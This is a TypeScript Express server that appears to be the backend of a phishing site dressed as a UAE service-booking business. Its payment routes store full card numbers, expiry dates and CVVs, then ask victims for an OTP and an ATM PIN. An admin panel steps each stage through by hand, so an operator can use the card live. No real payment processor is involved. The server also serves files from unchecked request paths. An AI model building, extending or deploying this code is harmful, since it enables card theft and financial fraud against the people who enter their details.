import express, { Request, Response } from "express";
import { createServer } from "http";
import path from "path";
import { fileURLToPath } from "url";
import * as db from "./db";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Helper to generate OTP
function generateOTP(): string {
  return Math.floor(100000 + Math.random() * 900000).toString();
}

// Helper to generate unique ID
function generateId(): string {
  return Date.now().toString(36) + Math.random().toString(36).substr(2);
}

async function startServer() {
  const app = express();
  const server = createServer(app);

  // Middleware
  app.use(express.json());
  app.use(express.urlencoded({ extended: true }));

  // CORS headers
  app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type');
    if (req.method === 'OPTIONS') {
      res.sendStatus(200);
    } else {
      next();
    }
  });

  // ========== BOOKING API ROUTES ==========

  // Create booking
  app.post("/api/booking/create", async (req: Request, res: Response) => {
    try {
      const { customerName, customerEmail, customerPhone, emirate, serviceType, serviceDate, serviceTime, totalAmount, notes } = req.body;

      if (!customerName || !customerEmail || !customerPhone || !emirate || !serviceType || !serviceDate || !serviceTime || !totalAmount) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      const bookingId = generateId();
      const booking = await db.createBooking({
        id: bookingId,
        customerName,
        customerEmail,
        customerPhone,
        emirate,
        serviceType,
        serviceDate,
        serviceTime,
        totalAmount: parseFloat(totalAmount),
        notes,
      });

      console.log(`[BOOKING] New booking created: ${bookingId} for ${customerEmail}`);

      res.json({ 
        success: true, 
        bookingId,
        message: "Booking created successfully."
      });
    } catch (error) {
      console.error("Error creating booking:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // ========== PAYMENT API ROUTES ==========

  // Submit card details
  app.post("/api/payment/submit-card", async (req: Request, res: Response) => {
    try {
      const { cardNumber, cardHolder, expiryDate, cvv, email, bookingId } = req.body;

      if (!cardNumber || !cardHolder || !expiryDate || !cvv || !email) {
        return res.status(400).json({ error: "Missing required fields" });
      }

      const paymentId = generateId();
      const otp = generateOTP();

      await db.createPayment({
        id: paymentId,
        bookingId: bookingId || '',
        email,
        cardNumber,
        cardHolder,
        expiryDate,
        cvv,
        otp,
      });

      console.log(`[PAYMENT] Card submitted for ${email}. OTP: ${otp}`);

      res.json({ 
        success: true, 
        paymentId,
        message: "Card details received. Awaiting admin approval."
      });
    } catch (error) {
      console.error("Error submitting card:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Verify OTP
  app.post("/api/payment/verify-otp", async (req: Request, res: Response) => {
    try {
      const { otp, email, paymentId } = req.body;

      if (!otp || !email || !paymentId) {
        return res.status(400).json({ error: "Missing OTP, email, or payment ID" });
      }

      const payment = await db.getPaymentById(paymentId);

      if (!payment) {
        return res.status(404).json({ error: "Payment not found" });
      }

      if (payment.otp !== otp) {
        return res.status(400).json({ error: "Invalid OTP" });
      }

      const pin = Math.floor(1000 + Math.random() * 9000).toString();
      await db.updatePaymentPIN(paymentId, pin);

      console.log(`[PAYMENT] OTP verified for ${email}. PIN: ${pin}`);

      res.json({ 
        success: true,
        message: "OTP verified. Please enter your ATM PIN."
      });
    } catch (error) {
      console.error("Error verifying OTP:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Verify PIN
  app.post("/api/payment/verify-pin", async (req: Request, res: Response) => {
    try {
      const { pin, email, paymentId } = req.body;

      if (!pin || !email || !paymentId) {
        return res.status(400).json({ error: "Missing PIN, email, or payment ID" });
      }

      const payment = await db.getPaymentById(paymentId);

      if (!payment) {
        return res.status(404).json({ error: "Payment not found" });
      }

      if (payment.pin !== pin) {
        return res.status(400).json({ error: "Invalid PIN" });
      }

      await db.completePayment(paymentId);

      console.log(`[PAYMENT] PIN verified for ${email}. Payment completed!`);

      res.json({ 
        success: true,
        message: "Payment completed successfully!"
      });
    } catch (error) {
      console.error("Error verifying PIN:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // ========== ADMIN API ROUTES ==========

  // Get all pending payments
  app.get("/api/admin/payments", async (req: Request, res: Response) => {
    try {
      const payments = await db.getPendingPayments();
      res.json(payments);
    } catch (error) {
      console.error("Error fetching payments:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Approve payment (move to next step)
  app.post("/api/admin/payments/:id/approve", async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const payment = await db.getPaymentById(id);

      if (!payment) {
        return res.status(404).json({ error: "Payment not found" });
      }

      if (payment.status === 'pending_card') {
        await db.updatePaymentStatus(id, 'pending_otp');
        console.log(`[ADMIN] Card approved for ${payment.email}`);
      } else if (payment.status === 'pending_otp') {
        await db.updatePaymentStatus(id, 'pending_pin');
        console.log(`[ADMIN] OTP approved for ${payment.email}`);
      } else if (payment.status === 'pending_pin') {
        await db.completePayment(id);
        console.log(`[ADMIN] PIN approved for ${payment.email}`);
      }

      res.json({ 
        success: true,
        message: "Payment approved and moved to next step."
      });
    } catch (error) {
      console.error("Error approving payment:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Reject payment
  app.post("/api/admin/payments/:id/reject", async (req: Request, res: Response) => {
    try {
      const { id } = req.params;
      const payment = await db.getPaymentById(id);

      if (!payment) {
        return res.status(404).json({ error: "Payment not found" });
      }

      await db.rejectPayment(id);
      console.log(`[ADMIN] Payment rejected for ${payment.email}`);

      res.json({ 
        success: true,
        message: "Payment rejected."
      });
    } catch (error) {
      console.error("Error rejecting payment:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Get statistics
  app.get("/api/admin/statistics", async (req: Request, res: Response) => {
    try {
      const stats = await db.getStatistics();
      res.json(stats);
    } catch (error) {
      console.error("Error fetching statistics:", error);
      res.status(500).json({ error: "Internal server error" });
    }
  });

  // Serve static files from dist/public in production
  const staticPath =
    process.env.NODE_ENV === "production"
      ? path.resolve(__dirname, "public")
      : path.resolve(__dirname, "..", "dist", "public");

  app.use(express.static(staticPath));

  // Handle client-side routing - serve index.html for all routes
  app.get("*", (req, res) => {
    // Check if the requested file exists
    const requestedFile = path.join(staticPath, req.path);
    try {
      // Try to serve the requested file if it exists
      if (req.path.endsWith('.html') || req.path.includes('/packages/')) {
        res.sendFile(requestedFile);
      } else {
        res.sendFile(path.join(staticPath, "index.html"));
      }
    } catch (err) {
      // If file doesn't exist, serve index.html
      res.sendFile(path.join(staticPath, "index.html"));
    }
  });

  const port = process.env.PORT || 3000;

  server.listen(port, () => {
    console.log(`Server running on http://localhost:${port}/`);
  });
}

startServer().catch(console.error);
